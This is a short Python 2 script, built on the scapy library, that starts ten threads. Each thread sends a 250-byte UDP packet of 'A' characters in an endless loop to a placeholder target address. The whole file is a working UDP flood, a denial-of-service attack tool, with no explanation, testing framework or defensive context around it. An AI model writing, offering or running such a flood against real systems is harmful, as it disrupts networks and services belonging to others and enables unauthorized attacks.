#!/usr/bin/env python

import thread 
from scapy.all import *

def worker(id):

    msg = 'A' * 250
    pkt = IP(dst='<target_ip>')/UDP()/msg
    while True:
        send(pkt)

for i in range(10):
    print "starting thread" + str(i)
    thread.start_new_thread(worker, (i,))

while True:
    pass
